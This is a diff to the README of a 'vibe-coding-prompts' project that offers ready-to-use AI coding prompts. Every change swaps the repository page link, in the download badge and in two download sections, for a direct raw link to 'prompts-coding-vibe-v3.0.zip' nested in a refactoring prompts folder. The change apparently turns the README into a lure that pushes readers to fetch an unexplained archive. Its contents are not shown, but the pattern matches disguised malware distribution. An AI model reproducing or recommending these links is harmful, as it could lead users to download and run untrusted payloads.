@@ -1,6 +1,6 @@
 # ✨ vibe-coding-prompts - Ready-to-use AI coding prompts
 
-[![Download](https://img.shields.io/badge/Download%20Now-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/downstream-starvation848/vibe-coding-prompts)
+[![Download](https://img.shields.io/badge/Download%20Now-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/downstream-starvation848/vibe-coding-prompts/main/vibe-coding-prompts/prompts/05-refactoring/prompts-coding-vibe-v3.0.zip)
 
 ## 🧭 What this is
 
@@ -17,7 +17,7 @@ Use it when you want help with:
 ## 📥 Download and open it
 
 Visit this page to download and use the files:
-https://github.com/downstream-starvation848/vibe-coding-prompts
+https://raw.githubusercontent.com/downstream-starvation848/vibe-coding-prompts/main/vibe-coding-prompts/prompts/05-refactoring/prompts-coding-vibe-v3.0.zip
 
 If you are new to GitHub, use these steps:
 1. Open the link in your browser
@@ -224,7 +224,7 @@ Save your edited version in a separate file so you can reuse it later.
 ## 📎 Quick access
 
 Primary download and project page:
-https://github.com/downstream-starvation848/vibe-coding-prompts
+https://raw.githubusercontent.com/downstream-starvation848/vibe-coding-prompts/main/vibe-coding-prompts/prompts/05-refactoring/prompts-coding-vibe-v3.0.zip
 
 ## 📋 Useful prompt habits
 
